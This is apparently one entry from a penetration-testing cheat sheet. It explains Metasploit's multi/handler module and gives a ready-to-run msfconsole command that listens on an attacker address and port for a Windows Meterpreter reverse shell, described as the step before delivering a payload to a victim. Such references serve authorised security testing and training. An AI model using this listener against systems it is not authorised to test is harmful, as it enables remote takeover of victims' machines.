---
description: |
  Metasploit's multi/handler module is a generic listener used to catch an incoming connection from a staged or stageless payload (e.g. a Meterpreter reverse shell generated with msfvenom, or dropped via an exploit). Setting the payload type, LHOST, and LPORT to match the payload being executed on the target allows the attacker to receive a fully-featured Meterpreter session once the payload calls back. This is typically the first step run before delivering any reverse-shell payload to a victim.

  Command Reference:

  	Attacker IP: 10.10.10.5

  	Listener Port: 4444

command: |
  msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.5; set LPORT 4444; run"
items:
  - No_Creds
OS:
  - Linux
  - Windows
phases:
  - Exploitation
references:
  - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html
---
